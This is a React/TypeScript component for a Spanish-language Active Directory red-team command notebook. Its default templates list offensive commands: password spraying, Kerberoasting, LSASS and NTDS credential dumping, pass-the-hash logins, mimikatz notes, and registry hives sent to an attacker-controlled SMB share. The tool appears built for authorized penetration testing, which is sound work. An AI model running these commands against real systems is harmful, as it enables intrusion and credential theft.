import { Check, Pencil, Plus, RotateCcw, Trash2, X } from "lucide-react";
import { useEffect, useState } from "react";

const categories = [
  "Recon",
  "Enumeracion",
  "Credenciales",
  "Explotacion",
  "Persistencia",
  "Extraccion",
  "Post-explotacion",
  "Infra",
  "Notas Windows",
] as const;

type ToolCategory = (typeof categories)[number];
type ToolKind = "command" | "note";

type ToolTemplate = {
  id: string;
  group: ToolCategory;
  kind: ToolKind;
  name: string;
  tool: string;
  command: string;
  authorizedTarget: string;
  notes: string;
};

const storageKey = "ad-redteam-tool-notebook";
const groupOrder = new Map(categories.map((category, index) => [category, index]));

function tool(
  id: string,
  group: ToolCategory,
  name: string,
  toolName: string,
  command: string,
  authorizedTarget: string,
  notes = "",
): ToolTemplate {
  return { id, group, kind: "command", name, tool: toolName, command, authorizedTarget, notes };
}

function note(id: string, group: ToolCategory, name: string, notes: string): ToolTemplate {
  return { id, group, kind: "note", name, tool: "nota", command: "", authorizedTarget: "localhost", notes };
}

const defaultTools: ToolTemplate[] = [
  tool("recon-nxc-smb", "Recon", "NetExec SMB baseline", "nxc", "nxc smb <ip_or_cidr>", "<ip_or_cidr>"),
  tool("recon-hosts-file", "Recon", "Editar /etc/hosts", "nano", "nano /etc/hosts", "localhost"),
  tool("recon-rustscan-scv", "Recon", "RustScan + scripts/versiones", "rustscan", "rustscan -a <ip_target> --no-banner -- -sCV", "<ip_target>"),
  tool("recon-nmap-udp-top", "Recon", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <ip_target> -Pn", "<ip_target>"),
  tool("recon-snmp-161", "Recon", "Nmap SNMP 161", "nmap", "nmap -sU -p 161 <ip_target>", "<ip_target>"),
  tool("recon-proxychains-mixed", "Recon", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <ip_target>", "<ip_target>"),

  tool("enum-rpc-null", "Enumeracion", "RPC null session", "rpcclient", "rpcclient -U \"\" <ip_target> -N", "<ip_target>"),
  tool("enum-rpc-creds", "Enumeracion", "RPC con credenciales", "rpcclient", "rpcclient -U \"<usuario>%<password>\" <ip_target>", "<ip_target>"),
  tool("enum-rpc-guest", "Enumeracion", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <ip_target>", "<ip_target>"),
  tool("enum-nxc-smb-null-shares", "Enumeracion", "SMB shares null", "nxc", "nxc smb <ip_target> -u '' -p '' --shares", "<ip_target>"),
  tool("enum-nxc-smb-null-rid", "Enumeracion", "RID brute null", "nxc", "nxc smb <ip_target> -u '' -p '' --rid-brute", "<ip_target>"),
  tool("enum-nxc-smb-guest-shares", "Enumeracion", "SMB shares guest", "nxc", "nxc smb <ip_target> -u 'Guest' -p '' --shares", "<ip_target>"),
  tool("enum-nxc-smb-guest-rid", "Enumeracion", "RID brute guest", "nxc", "nxc smb <ip_target> -u 'Guest' -p '' --rid-brute", "<ip_target>"),
  tool("enum-nxc-users-passwords", "Enumeracion", "Password spray user=user", "nxc", "nxc smb <ip_target> -u users -p users --no-bruteforce --continue-on-success", "<ip_target>", "Usar listas controladas. Cambia users por ficheros reales si procede."),
  tool("enum-smbclient-null-download", "Enumeracion", "Descargar share anonimo", "smbclient", "smbclient -N //<ip_target>/<share>/ -c \"recurse; prompt; mget *;\"", "<ip_target>"),
  tool("enum-smbclient-auth-download", "Enumeracion", "Descargar share con usuario", "smbclient", "smbclient //<ip_target>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "<ip_target>"),
  tool("enum-ldap-anon", "Enumeracion", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<dc_ip> -b 'DC=<domain_part>,DC=<domain_part>'", "<dc_ip>"),
  tool("enum-ldap-auth", "Enumeracion", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "<dc_ip>"),
  tool("enum-ldap-grep-passwords", "Enumeracion", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <ldap_output_file>", "localhost"),
  tool("enum-ldapdomaindump", "Enumeracion", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<dominio>\\<usuario>' -p '<password>' <dc_ip>", "<dc_ip>"),
  tool("enum-neo4j-start", "Enumeracion", "Iniciar Neo4j", "neo4j", "neo4j start", "localhost"),
  tool("enum-bloodhound-python", "Enumeracion", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <username> -p <password> -ns <ip_dc> -d <dominio.local> -c all", "<ip_dc>"),
  tool("enum-ntp-stop-sync", "Enumeracion", "Parar timesyncd", "systemctl", "systemctl stop systemd-timesyncd", "localhost"),
  tool("enum-ntpdate-dc", "Enumeracion", "Sincronizar hora con DC", "ntpdate", "ntpdate <ip_dc>", "<ip_dc>"),

  tool("cred-kerbrute-userenum", "Credenciales", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <dc_ip> -d <dominio> <users_list>", "<dc_ip>"),
  tool("cred-asrep", "Credenciales", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <user_list> <dominio>/", "<dc_ip>"),
  tool("cred-kerberoast", "Credenciales", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <dominio>/<user>:<password> -dc-ip <dc_ip> -request -outputfile hashes", "<dc_ip>"),
  tool("cred-certipy-vuln", "Credenciales", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <dc_ip> -vulnerable", "<dc_ip>"),
  tool("cred-lsassy-pass", "Credenciales", "LSASS con password", "lsassy", "lsassy -d <dominio.htb> -u <user> -p <password> <ip_target>", "<ip_target>", "Necesita credenciales admin local."),
  tool("cred-lsassy-hash", "Credenciales", "LSASS con hash NT", "lsassy", "lsassy -d <dominio.htb> -u <user> -H ':<NT>' <ip_target>", "<ip_target>", "Necesita credenciales admin local."),
  tool("cred-ntds", "Credenciales", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <NT> --ntds", "<ip_dc>"),
  tool("cred-secretsdump-sam-lsa", "Credenciales", "Secretsdump SAM + SECURITY", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL", "localhost"),
  tool("cred-secretsdump-sam", "Credenciales", "Secretsdump SAM", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL", "localhost"),
  tool("cred-samdump2", "Credenciales", "samdump2", "samdump2", "samdump2 SAM.save SYSTEM.save -o sam.txt", "localhost"),
  tool("cred-john-nt", "Credenciales", "Crack NT hashes", "john", "john --format=NT --wordlist=rockyou.txt sam.txt", "localhost"),

  tool("exploit-evil-winrm-pass", "Explotacion", "evil-winrm password", "evil-winrm", "evil-winrm -i <ip_target> -u <user> -p <password>", "<ip_target>"),
  tool("exploit-evil-winrm-hash", "Explotacion", "evil-winrm hash", "evil-winrm", "evil-winrm -i <ip_target> -u <user> -H <NT>", "<ip_target>"),
  tool("exploit-psexec-pass", "Explotacion", "psexec password", "impacket-psexec", "impacket-psexec <user>@<ip_target>", "<ip_target>"),
  tool("exploit-psexec-hash", "Explotacion", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<ip_target> -hashes <LM:NT>", "<ip_target>"),
  tool("exploit-rdp", "Explotacion", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<ip_target>:<port> /u:<user> /p:<password>", "<ip_target>"),

  tool("infra-smbserver", "Infra", "SMB server Kali", "impacket-smbserver", "impacket-smbserver recurso $(pwd) -smb2support", "localhost"),
  tool("extract-reg-backup", "Extraccion", "Backup remoto de registry", "impacket-reg", "impacket-reg '<dominio>/<user>:<pass>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "<ip_dc>"),
  tool("extract-nxc-sam", "Extraccion", "Extraer SAM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --sam", "<ip_dc>"),
  tool("extract-nxc-system", "Extraccion", "Extraer SYSTEM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --system", "<ip_dc>"),
  tool("extract-nxc-security", "Extraccion", "Extraer SECURITY", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --security", "<ip_dc>"),

  note("note-persistencia-placeholder", "Persistencia", "Notas de persistencia", "Categoria preparada para ir metiendo tecnicas validadas del entorno cuando las tengas en tus notas."),
  note("note-windows-mimikatz", "Notas Windows", "Mimikatz", "Comandos Windows omitidos de ejecucion Kali: mimikatz.exe, privilege::debug, sekurlsa::logonpasswords, lsadump::sam SYSTEM SAM."),
  note("note-windows-local-enum", "Notas Windows", "Enumeracion local Windows", "Referencia: whoami /all, cmdkey /list, Get-LocalUser, PSReadLine history, WinLogon registry, WMI Description."),
  note("note-windows-reg-save", "Notas Windows", "Registry save desde Windows", "Referencia: reg.exe save hklm\\sam, hklm\\system, hklm\\security hacia \\\\<kali_ip>\\recurso."),
];

function normalizeTool(raw: Partial<ToolTemplate>): ToolTemplate {
  const group = categories.includes(raw.group as ToolCategory) ? (raw.group as ToolCategory) : "Recon";
  const kind = raw.kind === "note" ? "note" : "command";

  return {
    id: raw.id || crypto.randomUUID(),
    group,
    kind,
    name: raw.name || "Nueva herramienta",
    tool: raw.tool || (kind === "note" ? "nota" : "tool"),
    command: raw.command || "",
    authorizedTarget: raw.authorizedTarget || "localhost",
    notes: raw.notes || "",
  };
}

function mergeDefaults(current: ToolTemplate[]) {
  const existingIds = new Set(current.map((item) => item.id));
  return [...current, ...defaultTools.filter((item) => !existingIds.has(item.id))];
}

export function ToolNotebook() {
  const [tools, setTools] = useState<ToolTemplate[]>(defaultTools);
  const [drafts, setDrafts] = useState<Record<string, ToolTemplate>>({});
  const [editingId, setEditingId] = useState<string | null>(null);

  useEffect(() => {
    const saved = window.localStorage.getItem(storageKey);
    if (!saved) {
      return;
    }

    try {
      const parsed = JSON.parse(saved) as Partial<ToolTemplate>[];
      setTools(parsed.map(normalizeTool));
    } catch {
      setTools(defaultTools);
    }
  }, []);

  function persist(nextTools: ToolTemplate[]) {
    const normalized = nextTools.map(normalizeTool);
    setTools(normalized);
    window.localStorage.setItem(storageKey, JSON.stringify(normalized));
  }

  function groupedTools() {
    return categories
      .map((group) => ({
        group,
        tools: tools.filter((toolItem) => toolItem.group === group),
      }))
      .filter((group) => group.tools.length > 0)
      .sort((left, right) => (groupOrder.get(left.group) ?? 99) - (groupOrder.get(right.group) ?? 99));
  }

  function startEditing(toolItem: ToolTemplate) {
    setEditingId(toolItem.id);
    setDrafts((current) => ({ ...current, [toolItem.id]: toolItem }));
  }

  function updateDraft(toolId: string, patch: Partial<ToolTemplate>) {
    const toolItem = tools.find((candidate) => candidate.id === toolId);
    if (!toolItem) {
      return;
    }

    setDrafts((current) => ({
      ...current,
      [toolId]: normalizeTool({ ...(current[toolId] ?? toolItem), ...patch }),
    }));
  }

  function saveTool(toolId: string) {
    const draft = drafts[toolId];
    if (!draft) {
      return;
    }

    persist(tools.map((toolItem) => (toolItem.id === toolId ? draft : toolItem)));
    setEditingId(null);
  }

  function addTool() {
    const newTool = tool(
      crypto.randomUUID(),
      "Recon",
      "Nueva herramienta",
      "nxc",
      "nxc smb <ip_target>",
      "<ip_target>",
    );
    persist([newTool, ...tools]);
    startEditing(newTool);
  }

  function importDefaults() {
    persist(mergeDefaults(tools));
  }

  function deleteTool(toolId: string) {
    persist(tools.filter((toolItem) => toolItem.id !== toolId));
  }

  return (
    <section className="panel notebook-panel">
      <div className="panel-header">
        <div>
          <p className="eyebrow">Notebook AD</p>
          <h2>Herramientas por funcionalidad</h2>
        </div>
        <div className="panel-actions">
          <button className="run-button secondary-action" type="button" onClick={importDefaults}>
            <RotateCcw size={16} />
            Importar plantilla
          </button>
          <button className="run-button" type="button" onClick={addTool}>
            <Plus size={16} />
            Agregar
          </button>
        </div>
      </div>

      <div className="notebook-groups">
        {groupedTools().map((group) => (
          <section className="notebook-group" key={group.group}>
            <h3>{group.group}</h3>
            <div className="tool-template-list">
              {group.tools.map((toolItem) => {
                const isEditing = editingId === toolItem.id;
                const draft = drafts[toolItem.id] ?? toolItem;

                return (
                  <article className="tool-template" key={toolItem.id}>
                    {isEditing ? (
                      <>
                        <div className="tool-template-grid">
                          <select
                            value={draft.group}
                            onChange={(event) =>
                              updateDraft(toolItem.id, { group: event.target.value as ToolCategory })
                            }
                          >
                            {categories.map((category) => (
                              <option key={category} value={category}>
                                {category}
                              </option>
                            ))}
                          </select>
                          <select
                            value={draft.kind}
                            onChange={(event) =>
                              updateDraft(toolItem.id, { kind: event.target.value as ToolKind })
                            }
                          >
                            <option value="command">Comando Kali</option>
                            <option value="note">Nota</option>
                          </select>
                          <input
                            value={draft.name}
                            onChange={(event) => updateDraft(toolItem.id, { name: event.target.value })}
                            placeholder="Nombre"
                          />
                          <input
                            value={draft.tool}
                            onChange={(event) => updateDraft(toolItem.id, { tool: event.target.value })}
                            placeholder="Tool"
                          />
                          <input
                            value={draft.authorizedTarget}
                            onChange={(event) =>
                              updateDraft(toolItem.id, { authorizedTarget: event.target.value })
                            }
                            placeholder="Target autorizado"
                          />
                        </div>
                        {draft.kind === "command" ? (
                          <textarea
                            value={draft.command}
                            onChange={(event) => updateDraft(toolItem.id, { command: event.target.value })}
                            placeholder="Comando"
                          />
                        ) : null}
                        <textarea
                          className="notes-editor"
                          value={draft.notes}
                          onChange={(event) => updateDraft(toolItem.id, { notes: event.target.value })}
                          placeholder="Notas"
                        />
                        <div className="command-actions">
                          <button className="icon-button" type="button" onClick={() => saveTool(toolItem.id)}>
                            <Check size={15} />
                          </button>
                          <button
                            className="icon-button secondary"
                            type="button"
                            onClick={() => setEditingId(null)}
                          >
                            <X size={15} />
                          </button>
                        </div>
                      </>
                    ) : (
                      <>
                        <div className="tool-template-title">
                          <strong>{toolItem.name}</strong>
                          <span>{toolItem.kind === "command" ? "Kali" : "Nota"}</span>
                          <span>{toolItem.tool}</span>
                          <span>{toolItem.authorizedTarget}</span>
                        </div>
                        {toolItem.kind === "command" ? <code>{toolItem.command}</code> : null}
                        {toolItem.notes ? <p className="tool-notes">{toolItem.notes}</p> : null}
                        <div className="command-actions">
                          <button
                            className="icon-button secondary"
                            type="button"
                            onClick={() => startEditing(toolItem)}
                          >
                            <Pencil size={15} />
                          </button>
                          <button
                            className="icon-button danger"
                            type="button"
                            onClick={() => deleteTool(toolItem.id)}
                          >
                            <Trash2 size={15} />
                          </button>
                        </div>
                      </>
                    )}
                  </article>
                );
              })}
            </div>
          </section>
        ))}
      </div>
    </section>
  );
}
